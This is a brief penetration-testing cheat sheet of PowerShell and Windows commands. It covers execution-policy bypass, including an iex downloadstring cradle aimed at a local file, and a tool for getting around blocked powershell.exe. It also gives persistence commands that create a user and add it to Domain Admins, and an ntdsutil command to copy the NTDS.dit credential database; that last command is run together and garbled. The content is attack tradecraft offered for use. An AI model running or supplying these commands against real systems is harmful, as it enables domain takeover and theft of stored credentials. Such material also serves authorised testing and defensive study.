# ☄ Powershell Commands Cheat Sheet

**Execution Bypass**

* ```
  Set-ExecutionPolicy Unrestricted 
  ./file.ps1
  ```
* ```
  Import-Module script.psm1
  Invoke-FunctionThatIsIntheModule
  ```
* ```
  iex(new-object system.net.webclient).downloadstring(“file:///C:\examplefile.ps1”)
  ```

**Powershell.exe blocked**

* Use ‘not powershell’ [https://github.com/Ben0xA/nps](https://github.com/Ben0xA/nps)

Persistence

* ```
  net user username "password" /ADD
  ```
* ```
  net group "Domain Admins" %username% /DOMAIN /ADD
  ```

**Gather NTDS.dit file**

* `ntdsutilactivate instance ntdsifmcreate full C:\ntdsutilquitquit`
